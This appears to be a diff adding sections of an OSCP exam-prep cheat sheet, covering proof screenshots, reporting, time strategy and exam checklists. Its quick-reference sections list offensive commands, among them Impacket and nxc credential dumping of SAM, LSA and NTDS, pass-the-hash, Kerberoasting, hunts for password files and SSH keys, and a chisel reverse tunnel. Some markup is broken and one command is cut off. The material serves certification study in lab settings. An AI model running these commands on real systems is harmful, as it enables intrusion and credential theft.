@@ -1,0 +1,934 @@
+<h2 id="ref-18-reporting-documentation">18. REPORTING &amp; DOCUMENTATION</h2>
+<blockquote>
+<p><strong>Official proof rule:</strong> each <code>local.txt</code> / <code>proof.txt</code> must be shown from its <strong>original location</strong> in an <strong>interactive shell</strong> using <code>cat</code> or <code>type</code>, and the same screenshot must show the target's IP address using <code>ip addr</code>, <code>ifconfig</code> or <code>ipconfig</code>. A web-based shell is not valid for proof-file submission.</p>
+</blockquote>
+<blockquote>
+<p><strong>Control-panel rule:</strong> submit every obtained <code>local.txt</code> / <code>proof.txt</code> value in the exam control panel <strong>before the attack window ends</strong>.</p>
+</blockquote>
+<details id="ref-18-1-screenshot-requirements-never-fail-on-this">
+<summary>📸 18.1 Screenshot Requirements --- Never Fail on This</summary>
+<p><code>[REPORT:PROOF] [EVIDENCE:PACKET]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── LINUX PROOF SCREENSHOT ────────────────────────────────────
+# Single command that captures the required pair plus useful context:
+hostname; id; ip addr | grep 'inet '; pwd; cat /root/proof.txt
+# OR (more readable):
+echo "=== HOSTNAME ===" &amp;&amp; hostname
+echo "=== USER ===" &amp;&amp; id &amp;&amp; whoami
+echo "=== IP ===" &amp;&amp; ip addr | grep 'inet '
+echo "=== PROOF ===" &amp;&amp; cat /root/proof.txt
+
+# ── WINDOWS PROOF SCREENSHOT ──────────────────────────────────
+echo === HOSTNAME === &amp;&amp; hostname
+echo === USER === &amp;&amp; whoami
+echo === IP === &amp;&amp; ipconfig | findstr /I "IPv4"
+echo === PROOF === &amp;&amp; type C:\Users\Administrator\Desktop\proof.txt
+
+# ── WHAT THE SCREENSHOT MUST SHOW ────────────────────────────
+# REQUIRED: full proof.txt/local.txt contents read with cat/type from the ORIGINAL path
+# REQUIRED: target IP via ip addr/ifconfig/ipconfig in the SAME readable screenshot
+# REQUIRED: run in an interactive target shell (PowerShell Core/PSSession counts)
+# Optional context: hostname + whoami/id + current directory
+
+# ── TAKE SCREENSHOTS AS YOU GO ────────────────────────────────
+# Don't wait until the end — screenshot every major step:
+# - Initial nmap results
+# - Service version that led to exploit
+# - Exploit running
+# - Initial shell (whoami)
+# - Privesc technique used
+# - Root/Admin proof
+</code></pre>
+</details>
+<details id="ref-18-2-proof-file-locations">
+<summary>📄 18.2 Proof File Locations</summary>
+<p><code>[REPORT:PROOF]</code></p>
+<pre class="ref-code"><code>LINUX:
+  User flag: /home/USERNAME/local.txt
+  Root flag: /root/proof.txt
+
+WINDOWS:
+  User flag: C:\Users\USERNAME\Desktop\local.txt
+  Admin flag: C:\Users\Administrator\Desktop\proof.txt
+
+IMPORTANT:
+  - Use the exact ORIGINAL flag path present on the target; do not copy/download it for proof
+  - Submit flags in the control panel AS SOON AS you get them
+  - Don't rely on memory — copy/paste to notes immediately
+  - If access is denied, verify the exact path, identity and ACL; do not infer success/failure from one guess
+  - On stand-alone machines, both flags contribute points — don't skip local.txt
+  - On AD machines, do NOT infer points from local.txt/proof.txt; follow the exact objectives and values shown in the Exam Control Panel
+  
+STAND-ALONE MACHINE POINTS:
+  - Initial access / local.txt objective = 10 pts
+  - Privilege escalation / proof.txt objective = +10 pts
+  - Fully completed stand-alone machine = 20 pts
+  - AD set scoring is separate: machine #1 = 10, machine #2 = 10, machine #3 = 20 (40 total)
+  - Document every attack step, command and relevant output; insufficient documentation can reduce or eliminate credit
+</code></pre>
+</details>
+<details id="ref-18-3-note-taking-template-use-per-machine">
+<summary>📝 18.3 Note-Taking Template (Use Per Machine)</summary>
+<pre class="ref-code"><code class="language-markdown"># Machine: TARGET_IP — HOSTNAME
+
+## Status: [ ] Scanning [ ] Foothold [ ] Privesc [ ] Root [ ] Documented
+
+## Open Ports
+| Port | Service | Version | Notes |
+|------|---------|---------|-------|
+| 22   | SSH     | OpenSSH 7.4 | |
+| 80   | HTTP    | Apache 2.4 | WordPress |
+
+## Credentials Found
+| Username | Password | Hash | Service | Where Found |
+|----------|----------|------|---------|-------------|
+| admin    | &lt;redacted&gt; |      | SSH     | /etc/backup |
+
+## Attack Path
+1. Port 80 → WordPress 5.2.3
+2. wpscan → user: admin
+3. Recovered/validated credential → admin:&lt;redacted&gt; (record source + exact login proof)
+4. Theme editor → PHP shell
+5. Shell as www-data
+6. /etc/cron.d → root runs /opt/backup.sh
+7. /opt/backup.sh writable → reverse shell
+8. Root!
+
+## Commands Used
+```bash
+# Key commands here
+</code></pre>
+<h2>Proof</h2>
+<ul>
+<li>local.txt: [CONTENT]</li>
+<li>proof.txt: [CONTENT]</li>
+<li>Screenshots: [FILENAMES]</li>
+</ul>
+<!-- -->
+<pre class="ref-code"><code>&lt;/details&gt;
+
+&lt;details&gt;
+&lt;summary&gt;📊 18.4 OSCP Report Structure&lt;/summary&gt;
+</code></pre>
+<p>REQUIRED SECTIONS: 1. High-Level Summary - # of machines compromised -
+Severity of findings</p>
+<ol start="2">
+<li>Methodology
+<ul>
+<li>Tools used</li>
+<li>General approach</li>
+</ul>
+</li>
+<li>Per-Machine Writeup (for EACH machine):
+a.  Machine info (IP, OS, hostname)
+b.  Service enumeration
+c.  Exploitation (step by step, with screenshots)
+d.  Post-exploitation
+e.  Privilege escalation (step by step, with screenshots)
+f.  Proof (original-path cat/type in an interactive shell; target IP + full flag visible together)</li>
+<li>Appendix
+<ul>
+<li>Tool outputs</li>
+<li>Modified exploit code (full code)</li>
+</ul>
+</li>
+</ol>
+<p>REPORT TIPS: - Document the commands/output needed to reproduce the compromise step-by-step</p>
+<ul>
+<li>Keep screenshots readable and tied to each step</li>
+<li>For an UNMODIFIED public exploit, OffSec says provide the source URL rather than dumping pages of code</li>
+<li>For a MODIFIED exploit, include the modified code, original URL, shellcode command if applicable,
+highlight the changes, and explain why they were required</li>
+<li>Submit the PDF inside the required .7z archive within 24 hours of exam end</li>
+</ul><p>COMMON REPORT FAILURES: ✗ Proof screenshot without IP visible ✗ Steps
+not reproducible from your writeup ✗ Missing screenshots at key steps ✗
+No proof of privilege escalation method ✗ Late submission</p>
+<pre class="ref-code"><code>&lt;/details&gt;
+
+&lt;details&gt;
+</code></pre>
+<summary>⏱️ 18.5 Time Management — 2026 Rotation Strategy</summary>
+<p><code>[TIME:ROTATE]</code></p>
+<p>There is <strong>no universally correct "AD first" strategy</strong>. Recent pass reports include candidates who cleared AD early and others who passed mainly through standalones. Use evidence, not superstition.</p>
+<h3>Phase 1 — 0:00 to ~0:45: Build the board</h3>
+<ul>
+<li>Read every control-panel objective.</li>
+<li>Start full TCP/service enumeration on all targets.</li>
+<li>Record hostnames/vhosts immediately.</li>
+<li>Start issued-credential AD checks.</li>
+<li>Identify the <strong>two strongest attack signals</strong>, not the two machines you personally prefer.</li>
+</ul>
+<h3>Phase 2 — Work in 20–30 minute evidence blocks</h3>
+<p>Stay on a target while you are producing evidence:</p>
+<pre class="ref-code"><code class="language-text">new credential
+new file/share
+new service
+new privilege
+new attack edge
+new working primitive
+new validated exploit condition
+</code></pre>
+<p>If a block ends with <strong>no new evidence</strong>, write the next hypothesis and rotate.</p>
+<h3>Phase 3 — Bank points immediately</h3>
+<p>Whenever <code>local.txt</code> or <code>proof.txt</code> is obtained:</p>
+<ol>
+<li>Produce the official screenshot immediately.</li>
+<li>Submit the flag in the control panel immediately.</li>
+<li>Record the exact exploit/privesc steps.</li>
+<li>Update your current point total and passing combinations.</li>
+</ol>
+<h3>Phase 4 — At 70+ points</h3>
+<p>Before chasing extra points:</p>
+<pre class="ref-code"><code class="language-text">[ ] every earned flag submitted
+[ ] every proof screenshot valid
+[ ] IP + flag content visible
+[ ] proof read from original location via interactive shell
+[ ] exploit/privesc steps reproducible
+[ ] modified exploit code/changes preserved
+</code></pre>
+<p>Several recent passers intentionally used remaining access time to verify notes/screenshots rather than risk losing a pass through poor documentation.</p>
+<h3>Break schedule</h3>
+<ul>
+<li>Short break whenever you catch yourself repeating commands.</li>
+<li>Aim for a real 10–20 minute break every ~2–3 hours.</li>
+<li>Eat, hydrate, and sleep/rest if needed.</li>
+<li>OffSec explicitly expects candidates to take rest breaks, eat, drink and sleep during the 23h45m window.</li>
+</ul>
+<h3>"Read output twice" rule</h3>
+<p>Before declaring a tool useless:</p>
+<pre class="ref-code"><code class="language-text">1. Read the summary.
+2. Search output for ERROR / FAIL / WARN / password / user / writable / service / path.
+3. Compare it with your current hypothesis.
+</code></pre>
+<p>One July 2026 passer specifically attributed long delays to not paying enough attention to tool output.</p>
+</details>
+<pre class="ref-code"><code>---
+
+## 19. QUICK REFERENCE
+</code></pre>
+<blockquote>
+<p><strong>Before using this section:</strong> for clue-driven troubleshooting and immediate next actions, jump to <strong>Section 0 — Rapid-Response Layer</strong>. CARD</p>
+</blockquote>
+<pre class="ref-code"><code>&lt;details&gt;
+&lt;summary&gt;🔌 19.1 Ports &amp; Services Reference&lt;/summary&gt;
+</code></pre>
+<p>TCP PORTS: 21 FTP | 1080 SOCKS 22 SSH | 1099 Java RMI 23 Telnet |
+1433 MSSQL 25 SMTP | 1521 Oracle TNS 53 DNS | 2049 NFS 80 HTTP | 2375
+Docker API 88 Kerberos | 3268 LDAP GC 110 POP3 | 3306 MySQL 111
+RPCbind | 3389 RDP 119 NNTP | 3690 SVN 135 MSRPC | 4444 Metasploit
+default 139 NetBIOS | 5432 PostgreSQL 143 IMAP | 5900 VNC 161 SNMP
+(UDP) | 5985 WinRM HTTP 389 LDAP | 5986 WinRM HTTPS 443 HTTPS | 6379
+Redis 445 SMB | 6667 IRC 465 SMTPS | 8080 HTTP Alt 512 rexec | 8443
+HTTPS Alt 513 rlogin | 8888 HTTP Alt 514 rsyslog | 9200 Elasticsearch
+515 LPD/LPR | 27017 MongoDB 631 CUPS | 11211 Memcached 636 LDAPS |
+873 rsync |</p>
+<pre class="ref-code"><code>&lt;/details&gt;
+
+&lt;details&gt;
+&lt;summary&gt;🛠️ 19.2 Impacket Complete Toolkit&lt;/summary&gt;
+
+```bash
+# ── EXECUTION ─────────────────────────────────────────────────
+impacket-psexec     DOMAIN/user@IP          # SMB exec → SYSTEM
+impacket-smbexec    DOMAIN/user@IP          # SMB exec → service shell
+impacket-wmiexec    DOMAIN/user@IP          # WMI exec → no service
+impacket-atexec     DOMAIN/user@IP 'whoami' # Task scheduler
+impacket-dcomexec   DOMAIN/user@IP 'whoami' # DCOM exec
+
+# ── KERBEROS ──────────────────────────────────────────────────
+impacket-GetNPUsers    DOMAIN/ -dc-ip IP -request           # AS-REP roast
+impacket-GetUserSPNs   DOMAIN/user -dc-ip IP -request  # Kerberoast
+impacket-ticketer      -nthash HASH -domain-sid SID -domain DOMAIN user  # Ticket forge
+impacket-getTGT        DOMAIN/user                      # Get TGT
+impacket-getST         DOMAIN/user -spn cifs/target     # Get service ticket
+
+# ── CREDENTIAL DUMPING ────────────────────────────────────────
+impacket-secretsdump   DOMAIN/user@IP                   # Remote dump
+impacket-secretsdump   DOMAIN/user@IP -just-dc-ntlm     # NTDS only
+impacket-secretsdump   -sam SAM -system SYSTEM LOCAL         # Local files
+impacket-secretsdump   -ntds ntds.dit -system SYSTEM LOCAL   # NTDS.dit
+
+# ── ENUMERATION ───────────────────────────────────────────────
+impacket-lookupsid     DOMAIN/user@IP                   # SID enum
+impacket-samrdump      DOMAIN/user@IP                   # SAR dump
+impacket-rpcdump       IP                                    # RPC endpoints
+impacket-reg           DOMAIN/user@IP query -keyName HKU # Remote registry
+
+# ── FILE OPERATIONS ───────────────────────────────────────────
+impacket-smbclient     DOMAIN/user@IP                   # SMB client
+impacket-smbserver     share /path/to/share -smb2support     # Host SMB share
+
+# ── DATABASE ──────────────────────────────────────────────────
+impacket-mssqlclient   DOMAIN/user@IP                   # MSSQL client
+
+# ── NETWORK ───────────────────────────────────────────────────
+
+# ── WITH HASH (PtH) ───────────────────────────────────────────
+impacket-psexec    DOMAIN/user@IP -hashes :NTLMHASH
+impacket-wmiexec   DOMAIN/user@IP -hashes :NTLMHASH
+impacket-secretsdump DOMAIN/user@IP -hashes :NTLMHASH
+
+# ── WITH KERBEROS TICKET ──────────────────────────────────────
+export KRB5CCNAME=user.ccache
+impacket-psexec    DOMAIN/user@IP -no-pass -k
+</code></pre>
+
+<details id="ref-19-3-nxc-full-reference">
+<summary>⚡ 19.3 nxc Full Reference</summary>
+<pre class="ref-code"><code class="language-bash"># ── SMB ───────────────────────────────────────────────────────
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS"
+nxc smb IP -u user -H NTLMHASH          # PtH
+# Lockout-aware validation: one known/evidence-derived combination first
+nxc smb "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS"
+# If policy is known and evidence justifies a shortlist, use the Credential Debt/Guard workflow instead of blind spraying.
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --shares      # List shares
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --sessions    # Active sessions
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --users       # Domain users
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --groups      # Domain groups
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --computers   # Domain computers
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --loggedon-users
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --sam         # Dump SAM
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --lsa         # Dump LSA
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --ntds        # Dump NTDS (DC only)
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" -x 'whoami'   # Run cmd command
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" -X 'Get-Process'  # Run PS command
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --local-auth  # Local account auth
+# Validate a recovered local-admin hash on one justified host first; expand only through observed in-scope SMB targets / Credential Debt.
+nxc smb "$TARGET" -u "$AUTH_USER" -H "$NTLM_HASH" --local-auth
+
+# ── WINRM ─────────────────────────────────────────────────────
+nxc winrm $IP -u "$AUTH_USER" -p "$AUTH_PASS"
+nxc winrm $IP -u "$AUTH_USER" -p "$AUTH_PASS" -x 'whoami'
+
+# ── SSH ───────────────────────────────────────────────────────
+nxc ssh $IP -u "$AUTH_USER" -p "$AUTH_PASS"
+# Use only an evidence-derived shortlist against one justified host
+[ -s "$SHORTLIST" ] && nxc ssh "$TARGET" -u root -p "$SHORTLIST"
+
+# ── MSSQL ─────────────────────────────────────────────────────
+nxc mssql $IP -u "$AUTH_USER" -p "$AUTH_PASS" -q "SELECT @@version"
+nxc mssql $IP -u "$AUTH_USER" -p "$AUTH_PASS" --local-auth
+nxc mssql $IP -u "$AUTH_USER" -p "$AUTH_PASS" -x "whoami"  # xp_cmdshell
+
+# ── RDP ───────────────────────────────────────────────────────
+nxc rdp $IP -u "$AUTH_USER" -p "$AUTH_PASS"
+# Validate one justified host first; do not broad-spray RDP
+nxc rdp "$TARGET" -u Administrator -p "$AUTH_PASS"
+
+# ── OUTPUT INTERPRETATION ─────────────────────────────────────
+# [+] GREEN  = Authentication success
+# [-] RED    = Authentication failure
+# [*] BLUE   = Information
+# Pwn3d!    = Local admin / can execute commands
+</code></pre>
+</details>
+<details id="ref-19-4-essential-resources">
+<summary>🔗 19.4 Essential Resources</summary>
+<pre class="ref-code"><code>PRIVILEGE ESCALATION:
+  GTFOBins (Linux):     https://gtfobins.github.io
+  LOLBAS (Windows):     https://lolbas-project.github.io
+  WADComs (AD):         https://wadcoms.github.io
+
+SHELLS &amp; PAYLOADS:
+  RevShells generator:  https://www.revshells.com
+  PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
+
+EXPLOIT DATABASES:
+  ExploitDB:            https://www.exploit-db.com
+  Packetstorm:          https://packetstormsecurity.com
+  NVD CVE:              https://nvd.nist.gov/vuln/search
+
+HASH CRACKING:
+  Hashcat examples:     https://hashcat.net/wiki/doku.php?id=example_hashes
+  CrackStation:         https://crackstation.net  (quick online check)
+  Hashes.com:           https://hashes.com/en/decrypt/hash
+
+ENCODING/DECODING:
+  CyberChef:            https://gchq.github.io/CyberChef
+  JWT decoder:          https://jwt.io
+
+OSCP REFERENCE:
+  HackTricks:           https://book.hacktricks.xyz
+  IppSec YouTube:       https://www.youtube.com/@ippsec
+  S1ren OSCP guide:     https://github.com/0xsyr0/OSCP
+  TJ Null List:         https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8
+
+AD REFERENCE:
+  AD Security:          https://adsecurity.org
+  HackTricks AD:        https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
+  BloodHound queries:   https://github.com/ly4k/BloodHound/
+
+WORDLISTS:
+  SecLists:             https://github.com/danielmiessler/SecLists
+  Assetnote:            https://wordlists.assetnote.io
+
+OSCP EXAM GUIDE:
+  Official:             https://help.offsec.com/hc/en-us/articles/360040165632
+</code></pre>
+</details>
+<details id="ref-19-5-one-liner-command-bank">
+<summary>⚡ 19.5 One-Liner Command Bank</summary>
+<pre class="ref-code"><code class="language-bash">#Git clone and push using ssh : 
+GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.226.125:/git-server
+GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push origin master
+
+#Finding A file
+find / -type f -name user.txt
+
+# mtu packet set
+sudo ifconfig tun0 mtu 1198
+
+# ── QUICK WINS ────────────────────────────────────────────────
+# Check sudo instantly:
+sudo -l 2&gt;/dev/null
+
+# Find SUID instantly:
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# Find world-writable:
+find / -writable -type f 2&gt;/dev/null | grep -v proc | grep -v sys
+
+# Find passwords in files:
+grep -r "password\|passwd\|secret\|credential" /var/www/ 2&gt;/dev/null
+grep -r "password" /etc/ 2&gt;/dev/null | grep -v "#" | grep -v "Binary"
+
+# Check cron:
+cat /etc/cron* /var/spool/cron/crontabs/* 2&gt;/dev/null | grep -v "^#"
+
+# Check capabilities:
+getcap -r / 2&gt;/dev/null
+
+# Check listening services (internal):
+ss -tulnp | grep "127.0.0.1"
+netstat -antup | grep "127.0.0.1"
+
+# Check for ssh keys:
+find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2&gt;/dev/null
+
+# Unshadow for cracking:
+unshadow /etc/passwd /etc/shadow &gt; /tmp/combined.txt
+
+# ── PORT FORWARDING ONE-LINERS ────────────────────────────────
+# SSH local forward:
+ssh -L 8080:127.0.0.1:8080 -N user@PIVOT -i key
+
+# Chisel forward:
+./chisel client LHOST:8000 R:socks &amp;
+
+# Socat forward:
+socat TCP-LISTEN:8080,fork TCP:INTERNAL_IP:80 &amp;
+
+# ── SHELL UPGRADE ONE-LINER ───────────────────────────────────
+python3 -c 'import pty;pty.spawn("/bin/bash")' ; stty raw -echo ; fg
+
+# ── WINDOWS QUICK CHECKS ──────────────────────────────────────
+# Check all privesc vectors in one shot:
+whoami /all &amp; net user &amp; systeminfo &amp; tasklist &amp; schtasks /query /fo csv &amp; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2&gt;nul &amp; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2&gt;nul
+
+# Quick cred hunt:
+findstr /si "password" *.txt *.xml *.ini *.config 2&gt;nul
+dir /s /b *pass* *cred* *vnc* 2&gt;nul
+
+# ── AD QUICK WINS ─────────────────────────────────────────────
+# AS-REP roast with no creds:
+impacket-GetNPUsers DOMAIN/ -dc-ip IP -request -no-pass -usersfile users.txt
+
+# Kerberoast with creds:
+impacket-GetUserSPNs DOMAIN/user -dc-ip IP -request
+
+# One-password validation across a tiny confirmed-user shortlist:
+# Lockout-aware only: $USERS = evidence-derived shortlist; AUTH_PASS is session-only
+[ -s "$USERS" ] && nxc smb "$TARGET" -u "$USERS" -p "$AUTH_PASS" --continue-on-success
+
+# If DCSync is proven, collect only the required account first:
+impacket-secretsdump -just-dc-user "$DCSYNC_USER" -dc-ip "$DC_IP" -outputfile "dcsync-$DCSYNC_USER" "$DOMAIN/$AUTH_USER@$DC
+</code></pre>
+</details>
+<hr/>
+<details id="ref-19-x-stuck-20-30-minutes-reset-procedure">
+<summary>★ 19.x STUCK \&gt; 20--30 MINUTES --- RESET PROCEDURE</summary>
+<p><code>[STUCK:RESET]</code></p>
+<pre class="ref-code"><code class="language-text">STOP EXPLOITING
+      ↓
+FULL TCP PORTS?
+      ↓
+UDP?
+      ↓
+HOSTNAME / VHOST?
+      ↓
+MANUAL SERVICE ENUM?
+      ↓
+EXACT VERSION / BUILD?
+      ↓
+SOURCE / CONFIG / BACKUP?
+      ↓
+CREDENTIAL REUSE?
+      ↓
+INTERNAL-ONLY SERVICE?
+      ↓
+AUTOMATED PRIVESC?
+      ↓
+ACL / SUID / SERVICE / TASK?
+      ↓
+CVE PREREQUISITES?
+      ↓
+NEW HYPOTHESIS
+</code></pre>
+<p>If you have been repeating the same exploit path for 30 minutes, stop
+and enumerate a different layer.</p>
+</details>
+<h2 id="ref-20-exam-day-checklist">20. EXAM DAY CHECKLIST</h2>
+<details id="ref-20-1-before-the-exam-starts">
+<summary>🌅 20.1 Before the Exam Starts</summary>
+<pre class="ref-code"><code>NIGHT BEFORE:
+[ ] Sleep 7-8 hours minimum — this is non-negotiable
+[ ] Prepare food and water
+[ ] Test VPN connection
+[ ] Verify Kali VM is running properly
+[ ] Check all tools are installed and updated
+[ ] Review your notes / cheatsheet one final time
+[ ] Set up tmux config
+[ ] Prepare note-taking template (copy for 6 machines: 3 AD + 3 standalone)
+[ ] Know exam end time and set alarms for breaks
+
+30 MINUTES BEFORE:
+[ ] Verify normal Internet + backup hotspot/power plan
+[ ] Do NOT expect the exam VPN pack yet — OffSec sends it at the exact exam start
+[ ] Open note-taking application
+[ ] Open Burp Suite
+[ ] Start tmux session
+[ ] Verify tun0 IP: ip a show tun0
+[ ] Check: export LHOST=$(ip -4 addr show tun0 | grep -oP '(?&lt;=inet\s)\d+(\.\d+){3}')
+[ ] Have proof.txt screenshot template ready
+[ ] Have report template open
+[ ] Close/disable AI chatbot workflows — AI/LLMs are prohibited during exam AND reporting
+[ ] Read the exam instructions ONE MORE TIME
+[ ] Keep the current OffSec Exam Guide/FAQ bookmarked
+</code></pre>
+</details>
+<details id="ref-20-2-first-30-minutes-the-blitz">
+<summary>🚀 20.2 First 30 Minutes --- The Blitz</summary>
+<pre class="ref-code"><code class="language-bash"># ── AT THE EXACT START ────────────────────────────────────────
+# Download/extract the OffSec exam-connection pack and connect with the provided OpenVPN config.
+# Read the control panel before touching a target.
+
+# ── LAUNCH INITIAL ENUMERATION ────────────────────────────────
+# Enumerate every issued target, but keep one output set per IP and READ each result.
+# Put only the exact in-scope addresses in scope-ips.txt, one per line.
+while IFS= read -r IP; do
+  mkdir -p "$HOME/oscp/$IP"/{scans,loot,exploit,evidence}
+  sudo nmap -Pn -n --top-ports 1000 "$IP" -oA "$HOME/oscp/$IP/scans/tcp-top" &amp;
+  sudo nmap -Pn -n -p- --min-rate 1000 "$IP" -oA "$HOME/oscp/$IP/scans/tcp-all" &amp;
+done &lt; scope-ips.txt
+wait
+# If packets look dropped or expected services are missing, lower/remove --min-rate and rescan.
+
+# AutoRecon is optional for one unresolved target after manual review; do not let it replace reading output.
+# autorecon "$IP" --single-target --output "$HOME/oscp/$IP/autorecon"
+
+# ── WHILE SCANS RUN ───────────────────────────────────────────
+# Read the exam control panel carefully:
+# - Confirm the AD set username + password you've been issued
+# - Note any special instructions
+# - Note scoring breakdown
+# - Screenshot the control panel
+
+# ── FIRST ACTIONS BASED ON OPEN PORTS ────────────────────────
+# AD creds already issued → start AD enum with them immediately
+# SMB open everywhere → run nxc fingerprint
+# Port 88 open → it's an AD machine → note DC IP
+# Port 80 open → browse immediately, run gobuster
+</code></pre>
+</details>
+<details id="ref-20-3-machine-priority-decision-tree">
+<summary>🎯 20.3 Machine Priority &amp; Decision Tree</summary>
+<pre class="ref-code"><code>STEP 1: IDENTIFY MACHINE TYPES
+  Port 88 (Kerberos) + Port 389 (LDAP) = DOMAIN CONTROLLER
+  Multiple Windows machines with 445, entered via issued creds = AD Set
+  Everything else = Standalone (own foothold needed for each)
+  A BOF may exist as ONE standalone's low-priv vector — it's no
+  longer a guaranteed separate box (see Section 17 note)
+
+STEP 2: ATTACK ORDER — CHOOSE BY SIGNAL
+  Run issued-credential AD enumeration immediately, but do not blindly spend hours there.
+  Compare AD findings with standalone findings.
+
+  Start with whichever gives the clearest evidence:
+    • valid credential → remote access / interesting share / BloodHound edge
+    • obvious vulnerable application/version with matching prerequisites
+    • exposed secret / writable path / file-read / command primitive
+
+  Work in 20–30 minute evidence blocks.
+  No new evidence → rotate.
+  New evidence → continue.
+
+  Re-evaluate the official 70-point combinations after every flag.
+
+STEP 3: MINIMUM TO PASS (70 pts) — per OffSec, any ONE of:
+  40 AD (all 3 AD machines) + 3× local.txt                    = 70
+  40 AD + 2× local.txt + 1× proof.txt                          = 70
+  20 AD (2 of 3 AD machines) + 3× local.txt + 2× proof.txt     = 70
+  10 AD (1 of 3 AD machines) + all 3 standalones fully rooted  = 70
+  (no bonus points exist anymore — these combos are the only ways in)
+
+STEP 4: IF YOU GET STUCK
+  20–30 min or two failed tests with no new evidence = park the path
+  Record the failed hypothesis, missing prerequisite and exact return condition
+  Rotate to the strongest remaining signal; return only when evidence changes
+</code></pre>
+</details>
+<details id="ref-20-4-common-exam-mistakes-avoid-all-of-these">
+<summary>🚨 20.4 Common Exam Mistakes --- Avoid All of These</summary>
+<pre class="ref-code"><code>TECHNICAL MISTAKES:
+  ✗ Forgetting to check UDP ports (161 SNMP especially)
+  ✗ Not trying anonymous/null session on SMB and FTP
+  ✗ Not checking an evidence-based vendor/application default where lockout risk permits
+  ✗ Running Metasploit Auxiliary/Exploit/Post or Meterpreter on more than 1 target
+  ✗ Using a Metasploit module `check` on multiple targets
+  ✗ Using Metasploit for pivoting
+  ✗ Using SQLmap/SQLninja on the OSCP+ exam
+  ✗ Using Responder LLMNR/NBT-NS poisoning/spoofing
+  ✗ Using AI/LLM chatbots during the exam or report phase
+  ✗ Not URL-encoding payloads when injecting via URL
+  ✗ Forgetting EXITFUNC=thread in BOF shellcode
+  ✗ Not setting binary mode in FTP before downloading
+  ✗ Not testing found credentials on appropriate exposed in-scope services
+  ✗ Stopping at user shell — always try for root
+  ✗ Not reading /proc/self/fd/ when LFI is available
+  ✗ Missing internal ports (127.0.0.1 only services)
+  ✗ Not checking version numbers against searchsploit
+  ✗ Using staged payloads when target can't reach back
+
+DOCUMENTATION MISTAKES:
+  ✗ Not taking screenshot WITH IP visible
+  ✗ Proof screenshot shows filename but not contents
+  ✗ Forgetting to submit flags in control panel
+  ✗ Not documenting the exact exploit used
+  ✗ Missing screenshots of privilege escalation steps
+  ✗ Not noting every command that led to compromise
+  ✗ On a stand-alone, forgetting local.txt can leave 10 points unclaimed
+
+MENTAL MISTAKES:
+  ✗ Spending past the 20–30 minute/two-test evidence gate with no new fact
+  ✗ Not taking breaks — brain fog is real after 4+ hours
+  ✗ Tunnel vision — fixating on one service when others need attention
+  ✗ Not re-reading nmap results when stuck
+  ✗ Assuming a port is unimportant because it's non-standard
+  ✗ Not sleeping the night before the exam
+  ✗ Panicking — everything has a solution, breathe and enumerate
+
+SETUP MISTAKES:
+  ✗ Not setting LHOST to tun0 IP (using eth0 instead)
+  ✗ Forgetting to start a listener before sending exploit
+  ✗ Shells timing out because listener wasn't ready
+  ✗ File transfer failing because HTTP server not started
+  ✗ Using wrong architecture payload (x86 vs x64)
+  ✗ VPN disconnecting — check connectivity regularly
+</code></pre>
+</details>
+<details id="ref-20-5-pre-submission-checklist">
+<summary>✅ 20.5 Pre-Submission Checklist</summary>
+<pre class="ref-code"><code>BEFORE ENDING EXAM:
+[ ] All accessible flags captured (both local.txt and proof.txt)
+[ ] All flags submitted in control panel
+[ ] Official proof screenshot for EVERY earned flag:
+      ✓ flag contents shown from ORIGINAL location using cat/type in an INTERACTIVE shell
+      ✓ target IP visible in SAME screenshot using ip addr/ifconfig/ipconfig
+      + hostname / whoami/id may be included as useful extra context
+[ ] Exact reproduction steps documented while every shell/path is fresh
+[ ] Exploit code saved (for report)
+[ ] All tool outputs saved (nmap, gobuster, etc.)
+[ ] Shell history saved:
+      history &gt; ~/oscp/TARGET_IP/shell_history.txt
+[ ] Note exact versions of vulnerable services
+[ ] Note exact CVEs / exploit names used
+[ ] Document ALL credentials found
+
+REPORT SUBMISSION:
+[ ] AI/LLM chatbots remain PROHIBITED during reporting
+[ ] Use official OSCP report template or an equally structured professional template
+[ ] Include all required proof screenshots
+[ ] Every compromise must be reproducible step-by-step
+[ ] Target sections, IPs and report order checked against the control panel
+    (OffSec grades/values machines in the order documented)
+[ ] Unmodified public exploit: include its URL; do not dump pages of unchanged code
+[ ] Modified exploit: include modified code + original URL + highlighted changes/explanation
+[ ] PDF filename: OSCP-OS-XXXXX-Exam-Report.pdf
+[ ] Archive to: OSCP-OS-XXXXX-Exam-Report.7z (NO password)
+[ ] Create the .7z on Kali; archive contains only the final PDF; max upload size 200 MB
+[ ] Visually reopen/review the final exported PDF for formatting errors
+[ ] Upload within 24 hours at upload.offsec.com
+[ ] Compare the displayed upload MD5 with your local `md5sum`
+[ ] Click the final Submit File button
+[ ] Keep submission confirmation
+</code></pre>
+</details>
+<hr/>
+<details id="ref-2026-additions-easy-to-miss-modern-vectors">
+<summary>🔥 2026 ADDITIONS --- EASY-TO-MISS MODERN VECTORS</summary>
+<pre class="ref-code"><code class="language-text">[ ] Exact distro package revision, not just upstream version
+[ ] systemd timers, not only cron
